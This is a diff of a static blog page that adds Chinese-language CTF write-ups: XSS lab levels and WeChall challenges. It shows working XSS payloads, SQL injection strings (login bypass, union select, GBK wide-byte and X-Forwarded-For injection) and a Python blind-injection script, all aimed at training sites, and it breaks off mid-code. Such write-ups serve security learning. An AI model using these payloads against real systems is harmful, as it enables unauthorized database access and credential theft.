@@ -71,6 +71,79 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CTF-Web-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/01/CTF-Web-XSS/" class="article-date">
+  <time class="dt-published" datetime="2021-02-01T01:41:04.000Z" itemprop="datePublished">2021-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/01/CTF-Web-XSS/">CTF-Web-XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS靶机"><a href="#XSS靶机" class="headerlink" title="XSS靶机"></a>XSS靶机</h1><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">## 若执行了alert，则执行以下语句</span></span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:<span class="number">4</span>&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>观察到URL为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level1.php?name&#x3D;test</span><br></pre></td></tr></table></figure>
+<p>整个PHP文件只有URL处有输入空间，且test直接在下列语句中显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;欢迎用户test&lt;&#x2F;h2&gt;&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure>
+<p>审计源码，直接显示test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>故payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>keyword在php中为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;test&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>审计源码，做了htmlspecialchars的过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br></pre></td></tr></table></figure>
+<p>此处无法xss</p>
+<p>还有一处用到了keyword</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>需要闭合尖括号和双引号，因此payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level2.php?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="php的htmlspecialchars"><a href="#php的htmlspecialchars" class="headerlink" title="php的htmlspecialchars"></a>php的htmlspecialchars</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;：转换为&amp;</span><br><span class="line">&quot;：转换为&quot;</span><br><span class="line">&#39;：转换为成为 &#39;</span><br><span class="line">&lt;：转换为&lt;</span><br><span class="line">&gt;：转换为&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>需要绕过htmlspecialchars</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="绕过htmlspecialchars的方法"><a href="#绕过htmlspecialchars的方法" class="headerlink" title="绕过htmlspecialchars的方法"></a>绕过htmlspecialchars的方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用js事件的onclick</span><br><span class="line">&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS-game"></a>XSS-game</h1><p>地址：<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>直接在输入框输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/01/CTF-Web-XSS/" data-id="ckklyhztb00002gusfdjk0p78" data-title="CTF-Web-XSS" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-CTF-Web-SQL注入WAF绕过姿势" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date">
@@ -227,6 +300,102 @@
 <p>![CTF-wp-wechall Training Programming1](.\pic\CTF-wp-wechall Training Programming1.png)</p>
 <p>那么就可以构造以下脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?action=request&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?answer=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="built_in">dict</span>(WC=<span class="string">&quot;13191858-57927-oQHWYThmhwmYUy2X&quot;</span>)</span><br><span class="line">resp1 = requests.get(url1, cookies=cookie)</span><br><span class="line">resp2 = requests.get(url2.<span class="built_in">format</span>(resp1.text), cookies=cookie)</span><br><span class="line"></span><br><span class="line">print(resp2.text)</span><br></pre></td></tr></table></figure>
+<h1 id="Training-Regex"><a href="#Training-Regex" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^$&#x2F;</span><br></pre></td></tr></table></figure>
+<h1 id="Training-MYSQL-I"><a href="#Training-MYSQL-I" class="headerlink" title="Training: MYSQL I"></a>Training: MYSQL I</h1><p>考察：万能密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; #</span><br><span class="line">password: 123</span><br></pre></td></tr></table></figure>
+<p>注意，username处不能写admin’ or 1=1#，因为username在原sql语句中是where的筛选条件</p>
+<h1 id="Training-MYSQL-II"><a href="#Training-MYSQL-II" class="headerlink" title="Training: MYSQL II"></a>Training: MYSQL II</h1><p>考察：账号密码分开验证时，MYSQL登陆的绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: -1&#39; union select 1,&#39;admin&#39;,md5(&#39;password&#39;) #</span><br><span class="line">password: password</span><br></pre></td></tr></table></figure>
+<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p>考察：PHP代码审计，mysql的反引号</p>
+<p>观察可知，URL处的vote变量即每次提交button时加1的变量，猜测可在URL出注入</p>
+<p>阅读源码，直接跳到sql语句一处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;UPDATE noescvotes SET &#96;$who&#96;&#x3D;&#96;$who&#96;+1 WHERE id&#x3D;1&quot;;</span><br></pre></td></tr></table></figure>
+<p>故payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;no_escape&#x2F;index.php?vote_for&#x3D;bill&#96;&#x3D;111--+</span><br></pre></td></tr></table></figure>
+<p>注意此处为反引号，因为原sql语句就是反引号</p>
+<h2 id="mysql中的单引号、双引号、反引号"><a href="#mysql中的单引号、双引号、反引号" class="headerlink" title="mysql中的单引号、双引号、反引号"></a>mysql中的单引号、双引号、反引号</h2><p>单双引号用法相同，是使用字符串时使用的符号</p>
+<p>反引号用于区分mysql中的保留字符和普通字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select &#96;select&#96; from A;  #正确</span><br></pre></td></tr></table></figure>
+<h1 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h1><p>考察：宽字节注入<br>由于编码为gbk，且使用了addslashes过滤username处的单引号，使用宽字节注入</p>
+<p>由于原sql语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;SELECT username FROM users WHERE username&#x3D;&#39;$username&#39; AND password&#x3D;&#39;$password&#39;&quot;;</span><br></pre></td></tr></table></figure>
+<p>使用宽字节注入以后，语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM users WHERE username&#x3D;&#39;admin 运&#39; # AND password&#x3D;&#39;password&#39;</span><br></pre></td></tr></table></figure>
+<p>因此，还要再从数据库中选出username，因此有了如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;addslashes&#x2F;index.php?username&#x3D;admin+%Df%27+union+select+username+from+users+limit+1,1+%23&amp;password&#x3D;123&amp;login&#x3D;%E6%B3%A8%E5%86%8C</span><br></pre></td></tr></table></figure>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><strong>参考</strong></p>
+<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a></p>
+<p><strong>条件</strong></p>
+<p>​    编码为gbk</p>
+<p><strong>用法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1</span><br><span class="line">select * from user where  id &#x3D;&#39;1\&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1&#39; and 1&#x3D;1%23</span><br><span class="line">select * from user where id &#x3D;&#39;1運&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1%df&#39; and 1&#x3D;1%23</span><br></pre></td></tr></table></figure>
+<p><strong>原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GBK为多字节编码，两个字节代表一个汉字，此时%DF与后面的&#x2F;，也就是%5c变成了一个汉字</span><br></pre></td></tr></table></figure>
+<h1 id="The-Guestbook"><a href="#The-Guestbook" class="headerlink" title="The Guestbook"></a>The Guestbook</h1><p>考察：X-Forwarded-For注入</p>
+<p>上来搜$query语句，总共有下面这些</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_time&lt;$cut&quot;;</span><br><span class="line">$query &#x3D; &quot;INSERT INTO gbook_book VALUES(&#39;$playerid&#39;, $userid, $time, &#39;$ip&#39;, &#39;$message&#39;)&quot;; </span><br><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br></pre></td></tr></table></figure>
+<p>只有第2和4句有注入可能</p>
+<p>先看第4句，深入找一下playerid的地方，最终溯源到gbook_playerID，这个再往前找，是SESSION_ID。跳过</p>
+<p>看第2句，这五个变量来源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$playerid &#x3D; gbook_playerID(true); &#x2F;&#x2F; Current Player</span><br><span class="line">$userid &#x3D; 0; # guestbook has no login yet.</span><br><span class="line">$time &#x3D; time();</span><br><span class="line">$ip &#x3D; gbook_getIP();</span><br><span class="line">$message &#x3D; GDO::escape($message); </span><br></pre></td></tr></table></figure>
+<p>溯源以后发现只有ip有注入可能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function gbook_getIP()</span><br><span class="line">&#123;</span><br><span class="line">        if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">                return $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        elseif (isset($_SERVER[&#39;HTTP_VIA&#39;])) &#123; </span><br><span class="line">                return $_SERVER[&#39;HTTP_VIA&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">                return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>X-Forwarded-For注入，改一下包就完事了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#39;,(SELECT gbu_password FROM gbook_user WHERE gbu_name&#x3D;&#39;Admin&#39;));#</span><br></pre></td></tr></table></figure>
+<p>得到密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TheBrownFoxAndTheLazyDog</span><br></pre></td></tr></table></figure>
+<h1 id="MD5-salt"><a href="#MD5-salt" class="headerlink" title="MD5.salt"></a>MD5.salt</h1><p>考察：md5，回显注入</p>
+<p>参考：<a target="_blank" rel="noopener" href="http://rk700.github.io/2014/06/17/md5-salt/">http://rk700.github.io/2014/06/17/md5-salt/</a></p>
+<p>抓包，是post提交</p>
+<p>尝试username：admin’，有回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GDO Error(1064): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE username&#x3D;&#39;admin&#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>故尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p>回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin... checking your credentials...</span><br></pre></td></tr></table></figure>
+<p>用户名Admin的值是回显的，把password传给Admin的文职</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;-1&#39; union select password,3 from users where username&#x3D;&#39;Admin&#39;#</span><br></pre></td></tr></table></figure>
+<p>回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello 215c61d0104f8925b5f7e4e87a7cbdfa... checking your credentials...</span><br></pre></td></tr></table></figure>
+<p>然后需要破解MD5的工具，网上没有现成答案也没有免费的，跳过</p>
+<p>等等</p>
+<p>参考链接的wp没看懂怎么操作的，但是通过空密码用户去套取salt的方式值得参考</p>
+<h1 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h1><p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
+<p>可进入</p>
+<p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39;#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
+<p>得到同样信息，说明是可注入的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and 1&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
+<p>同样通过，那么可以使用布尔盲注或者updatexml</p>
+<p>优先选择updatexml，比较方便</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and updatexml(1,concat(0x7e,(database(),0x7e),1)#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
+<p>只有报错，没有回显</p>
+<p>尝试语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and if(1&#x3D;1,1,2)&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
+<p>能够登陆</p>
+<p>盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.wechall.net/challenge/table_names/challenge.php?username=test&#x27;+and+if(&#123;&#125;,1,2)=1%23&amp;password=test&amp;login=login&quot;</span></span><br><span class="line"></span><br><span class="line">success = <span class="string">&quot;Welcome back test&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">tb_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1, 60):</span></span><br><span class="line"><span class="comment"># 	low = 32</span></span><br><span class="line"><span class="comment"># 	high = 128</span></span><br><span class="line"><span class="comment"># 	while low &lt; high:</span></span><br><span class="line"><span class="comment"># 		mid = (low + high) &gt;&gt; 1</span></span><br><span class="line"><span class="comment"># 		payload = payload1.format(i, mid)</span></span><br><span class="line"><span class="comment"># 		resp = requests.get(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print(j)</span></span><br><span class="line"><span class="comment"># 		# print(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print( resp.text)</span></span><br><span class="line"><span class="comment"># 		if success in resp.text:</span></span><br><span class="line"><span class="comment"># 			low = mid + 1</span></span><br><span class="line"><span class="comment"># 		else:</span></span><br><span class="line"><span class="comment"># 			high = mid</span></span><br><span class="line"><span class="comment"># 	if low == 32 or high == 128:</span></span><br><span class="line"><span class="comment"># 		break</span></span><br><span class="line"><span class="comment"># 	else:</span></span><br><span class="line"><span class="comment"># 		db_name += chr(low)</span></span><br><span class="line"><span class="comment"># 		print(db_name)</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">&quot;gizmore_tableu61&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(db_name)</span><br><span class="line">payload3 = <span class="string">&quot;ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	high = <span class="number">128</span></span><br><span class="line">	<span class="keyword">while</span> low &lt; high:</span><br><span class="line">		mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">		payload = payload3.<span class="built_in">format</span>(payload2, i, mid)</span><br><span class="line">		resp = requests.get(url.<span class="built_in">format</span>(payload))</span><br><span class="line">		<span class="comment"># print(j)</span></span><br><span class="line">		<span class="comment"># print(url.format(payload))</span></span><br><span class="line">		<span class="comment"># print( resp.text)</span></span><br><span class="line">		<span class="keyword">if</span> success <span class="keyword">in</span> resp.text:</span><br><span class="line">			low = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high = mid</span><br><span class="line">	<span class="keyword">if</span> low == <span class="number">32</span> <span class="keyword">or</span> high == <span class="number">128</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tb_name += <span class="built_in">chr</span>(low)</span><br><span class="line">		print(tb_name)</span><br><span class="line">tb_name=<span class="string">&quot;aaawrong,usertableus4&quot;</span></span><br></pre></td></tr></table></figure>
+<p>答案为（试出来的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gizmore_tableu61_usertableus4</span><br></pre></td></tr></table></figure>
+<h1 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h1><p>考察：宽字节注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: 1 %Df%27 union select &#39;Admin&#39; from users#</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Training-Regex-1"><a href="#Training-Regex-1" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^wechall$&#x2F;</span><br></pre></td></tr></table></figure>
+<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p>考察：%00截断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 